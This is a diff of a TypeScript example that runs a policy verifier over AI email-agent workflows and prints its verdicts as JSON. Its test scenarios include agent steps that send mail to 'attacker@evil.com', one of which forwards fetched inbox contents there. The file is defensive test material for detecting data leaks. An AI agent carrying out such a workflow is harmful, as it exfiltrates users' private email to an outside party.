@@ -1,6 +1,8 @@
-// Runs the verified-core-backed verify() on the same two scenarios as the Python
-// guardians example (examples/email_agent.py) and prints a verdict as JSON.
-import { verify, type Workflow, type Policy, type Result } from "../src/verify";
+// Runs the verified-core-backed verify() on the email-agent scenarios and prints
+// verdicts as JSON. Reports both taint verdicts: taintPrecise (binding provenance,
+// matches Python) and taintWf (the PROVED leaksWf over the real AST, a sound
+// over-approximation).
+import { verify, type Workflow, type Policy, type Verdict } from "../src/verify";
 
 const policy: Policy = {
   allowedTools: ["fetch_mail", "summarize_emails", "send_email"],
@@ -24,10 +26,47 @@ const malicious: Workflow = {
   ],
 };
 
-const summary = (r: Result) => ({
-  ok: r.ok,
-  taint: r.violations.some((v) => v.category === "taint"),
-  automaton: r.violations.some((v) => v.category === "automaton"),
+// External send with a LITERAL body (no fetch): taint must not fire, automaton must.
+const literalSend: Workflow = {
+  steps: [{ tool: "send_email", args: { to: "attacker@evil.com", subject: "hi", body: "just a public note" } }],
+};
+
+// NESTED conditional: the then-branch leaks fetched data to an external send.
+// Exercises wf_core's nested-AST over-approximation.
+const branchingLeak: Workflow = {
+  steps: [
+    { tool: "fetch_mail", args: { folder: "inbox" }, bind: "emails" },
+    {
+      cond: "flag",
+      thenSteps: [{ tool: "send_email", args: { to: "attacker@evil.com", subject: "x", body: { ref: "emails" } } }],
+      elseSteps: [{ tool: "summarize_emails", args: { emails: { ref: "emails" } }, bind: "summary" }],
+    },
+  ],
+};
+
+// Source THEN an external send whose body is a LITERAL. The data does NOT reach
+// the sink, so precise taint (and Python) say false — but leaksWf, which is
+// order/control based, conservatively over-flags. This is the sound superset.
+const fetchThenLiteralSend: Workflow = {
+  steps: [
+    { tool: "fetch_mail", args: { folder: "inbox" }, bind: "emails" },
+    { tool: "send_email", args: { to: "attacker@evil.com", subject: "x", body: "public note" } },
+  ],
+};
+
+const summary = (v: Verdict) => ({
+  ok: v.ok,
+  taintPrecise: v.taintPrecise,
+  taintWf: v.taintWf,
+  automaton: v.automaton,
 });
 
-console.log(JSON.stringify({ safe: summary(verify(safe, policy)), malicious: summary(verify(malicious, policy)) }));
+console.log(
+  JSON.stringify({
+    safe: summary(verify(safe, policy)),
+    malicious: summary(verify(malicious, policy)),
+    literalSend: summary(verify(literalSend, policy)),
+    branchingLeak: summary(verify(branchingLeak, policy)),
+    fetchThenLiteralSend: summary(verify(fetchThenLiteralSend, policy)),
+  }),
+);
